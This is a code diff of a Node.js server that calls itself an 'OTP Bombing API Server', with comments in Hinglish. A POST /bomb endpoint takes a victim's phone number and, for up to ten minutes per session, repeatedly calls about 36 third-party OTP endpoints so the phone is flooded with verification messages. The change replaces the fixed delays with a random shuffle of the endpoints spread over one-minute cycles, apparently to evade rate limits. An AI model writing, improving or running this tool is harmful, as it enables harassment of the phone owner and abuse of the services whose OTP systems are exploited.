@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (v9.0 SEQUENTIAL)
-// Sequential + Delay | No MongoDB | Parallel Sessions | 10min Cap
+// api_server.js - OTP Bombing API Server (v10.0)
+// Random Shuffle + 1 Min Cycle + Parallel Sessions
 // ============================================================
 
 const express = require('express');
@@ -20,9 +20,8 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // ============================================================
 
 const MAX_EFFECTIVE_DURATION = 10;      // 10 min highest cap
-const API_DELAY_MS = 200;                // 200ms delay between each API
-const CYCLE_DELAY_MS = 500;              // 500ms delay between cycles
-const PER_API_TIMEOUT = 8000;            // 8s timeout per API
+const CYCLE_DURATION_MS = 60 * 1000;    // 1 min per cycle (poori API list)
+const PER_API_TIMEOUT = 8000;           // 8s timeout per API
 const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;
 const LOG_RETENTION_MS = 2 * 60 * 1000;
 
@@ -628,7 +627,20 @@ const APIS = [
     }
 ];
 
-logSuccess(`Loaded ${APIS.length} working APIs (sequential mode)`);
+logSuccess(`Loaded ${APIS.length} working APIs (random shuffle mode)`);
+
+// ============================================================
+// ===== SHUFFLE FUNCTION (Fisher-Yates) =====
+// ============================================================
+
+function shuffleArray(array) {
+    const shuffled = [...array];
+    for (let i = shuffled.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+    }
+    return shuffled;
+}
 
 // ============================================================
 // ===== API CALL FUNCTION =====
@@ -707,7 +719,6 @@ async function makeApiCall(api, phone, timeoutMs = PER_API_TIMEOUT) {
         clearTimeout(timeoutId);
 
         const responseTime = Date.now() - startTime;
-        // 🔥 Sirf 200-299 ko success maano
         const success = response.status >= 200 && response.status < 300;
         return { success, status: response.status, responseTime };
 
@@ -723,7 +734,7 @@ async function makeApiCall(api, phone, timeoutMs = PER_API_TIMEOUT) {
 }
 
 // ============================================================
-// ===== BOMBING SESSION (SEQUENTIAL) =====
+// ===== BOMBING SESSION (RANDOM SHUFFLE + 1 MIN CYCLE) =====
 // ============================================================
 
 async function runBombingSession(sessionId, phone, durationMinutes) {
@@ -734,45 +745,62 @@ async function runBombingSession(sessionId, phone, durationMinutes) {
     const endTime = startTime + (durationMinutes * 60 * 1000);
 
     logInfo(`⚔️  SESSION ${sessionId} START | Phone: ${phone} | Duration: ${durationMinutes}min`);
+    logInfo(`🎲 SESSION ${sessionId} | Random shuffle mode: har cycle me naya order`);
 
     while (Date.now() < endTime && activeSessions.has(sessionId)) {
         session.cycleCount++;
         const cycleNum = session.cycleCount;
 
-        logInfo(`🔄 SESSION ${sessionId} | Cycle #${cycleNum} START | ${APIS.length} APIs sequential call...`);
+        // 🔥 RANDOM SHUFFLE — har cycle me naya order
+        const shuffledApis = shuffleArray(APIS);
 
-        // 🔥 SEQUENTIAL CALL — ek ke baad ek
-        for (let i = 0; i < APIS.length; i++) {
+        logInfo(`🔄 SESSION ${sessionId} | Cycle #${cycleNum} START | ${shuffledApis.length} APIs (random order, spread over 1 min)`);
+
+        // 🔥 Calculate delay between APIs to spread over 1 min
+        // Total 60s / 36 APIs = ~1666ms per API
+        const totalApis = shuffledApis.length;
+        const delayPerApi = Math.floor(CYCLE_DURATION_MS / totalApis);
+
+        const cycleStartTime = Date.now();
+
+        for (let i = 0; i < totalApis; i++) {
             // Check session still active
             if (!activeSessions.has(sessionId)) break;
 
-            const api = APIS[i];
+            const api = shuffledApis[i];
             const result = await makeApiCall(api, phone, PER_API_TIMEOUT);
 
             if (result.success) {
                 session.successCount++;
-                logSuccess(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${APIS.length}] ${api.name} → ${result.status} (${result.responseTime}ms)`);
+                logSuccess(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${totalApis}] ${api.name} → ${result.status} (${result.responseTime}ms)`);
             } else {
                 session.failCount++;
                 const statusText = result.status ? ` → ${result.status}` : ' → FAIL';
-                logFail(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${APIS.length}] ${api.name}${statusText} (${result.responseTime}ms)`);
+                logFail(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${totalApis}] ${api.name}${statusText} (${result.responseTime}ms)`);
             }
 
-            // 🔥 DELAY between APIs (rate limit avoid)
-            if (i < APIS.length - 1) {
-                await new Promise(r => setTimeout(r, API_DELAY_MS));
+            // 🔥 Delay to spread over 1 min
+            if (i < totalApis - 1) {
+                const elapsed = Date.now() - cycleStartTime;
+                const expectedTime = (i + 1) * delayPerApi;
+                const waitTime = Math.max(0, expectedTime - elapsed);
+
+                if (waitTime > 0) {
+                    await new Promise(r => setTimeout(r, waitTime));
+                }
             }
         }
 
-        logInfo(`✅ SESSION ${sessionId} | Cycle #${cycleNum} COMPLETE | Success: ${session.successCount} | Fail: ${session.failCount}`);
+        const cycleElapsed = ((Date.now() - cycleStartTime) / 1000).toFixed(1);
+        logInfo(`✅ SESSION ${sessionId} | Cycle #${cycleNum} COMPLETE in ${cycleElapsed}s | Success: ${session.successCount} | Fail: ${session.failCount}`);
 
-        // 🔥 Cycle delay (next cycle se pehle thoda wait)
-        if (Date.now() < endTime && activeSessions.has(sessionId)) {
-            await new Promise(r => setTimeout(r, CYCLE_DELAY_MS));
+        // Wait for next cycle (agar 1 min se kam me complete hua)
+        const remainingTime = CYCLE_DURATION_MS - (Date.now() - cycleStartTime);
+        if (remainingTime > 0 && Date.now() < endTime && activeSessions.has(sessionId)) {
+            await new Promise(r => setTimeout(r, remainingTime));
         }
     }
 
-    // Session complete
     activeSessions.delete(sessionId);
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
     logSuccess(`✅ SESSION ${sessionId} END | Phone: ${phone} | Cycles: ${session.cycleCount} | Success: ${session.successCount} | Fail: ${session.failCount} | Time: ${elapsed}s`);
@@ -788,8 +816,8 @@ app.get('/', (req, res) => {
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
         active_sessions: activeSessions.size,
-        mode: 'sequential',
-        api_delay_ms: API_DELAY_MS,
+        mode: 'random-shuffle',
+        cycle_duration_sec: CYCLE_DURATION_MS / 1000,
         uptime: process.uptime()
     });
 });
@@ -799,7 +827,7 @@ app.get('/health', (req, res) => {
         ready: true,
         total_apis: APIS.length,
         active_sessions: activeSessions.size,
-        mode: 'sequential',
+        mode: 'random-shuffle',
         uptime: process.uptime()
     });
 });
@@ -811,7 +839,6 @@ app.post('/bomb', async (req, res) => {
         return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
     }
 
-    // 🔥 10 MIN HIGHEST CAP
     const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);
 
     sessionCounter++;
@@ -830,7 +857,6 @@ app.post('/bomb', async (req, res) => {
 
     logInfo(`📱 NEW SESSION ${sessionId} | Phone: ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | Active: ${activeSessions.size}`);
 
-    // 🔥 Background me chalao
     runBombingSession(sessionId, phone, effectiveDuration).catch(err => {
         logError(`SESSION ${sessionId} ERROR: ${err.message}`);
         activeSessions.delete(sessionId);
@@ -842,8 +868,9 @@ app.post('/bomb', async (req, res) => {
         phone,
         duration: effectiveDuration,
         total_apis: APIS.length,
-        mode: 'sequential',
-        message: 'Sequential bombing started. Check /logs for status.'
+        mode: 'random-shuffle',
+        cycle_duration: '60s',
+        message: 'Bombing started. Random shuffle — each user gets different API order.'
     });
 });
 
@@ -896,9 +923,8 @@ app.post('/stop/:sessionId', (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
-        mode: 'sequential',
-        api_delay_ms: API_DELAY_MS,
-        cycle_delay_ms: CYCLE_DELAY_MS,
+        mode: 'random-shuffle',
+        cycle_duration_sec: CYCLE_DURATION_MS / 1000,
         apis: APIS.map(a => a.name)
     });
 });
@@ -912,12 +938,12 @@ app.listen(PORT, '0.0.0.0', () => {
     logSuccess(`API Server running on port ${PORT}`);
     logInfo(`Instance: ${process.env.INSTANCE_NAME || 'default'}`);
     logInfo(`APIs loaded: ${APIS.length}`);
-    logInfo(`Mode: SEQUENTIAL (one API at a time)`);
-    logInfo(`API delay: ${API_DELAY_MS}ms between each API`);
-    logInfo(`Cycle delay: ${CYCLE_DELAY_MS}ms between cycles`);
+    logInfo(`Mode: RANDOM SHUFFLE (har cycle me naya order)`);
+    logInfo(`Cycle duration: ${CYCLE_DURATION_MS / 1000}s per cycle`);
     logInfo(`Per-API timeout: ${PER_API_TIMEOUT}ms`);
     logInfo(`Max duration: ${MAX_EFFECTIVE_DURATION} min`);
     logInfo(`Parallel sessions: ENABLED`);
+    logInfo(`Different users → Different API order`);
 
     logStore.startCleanup();
 });
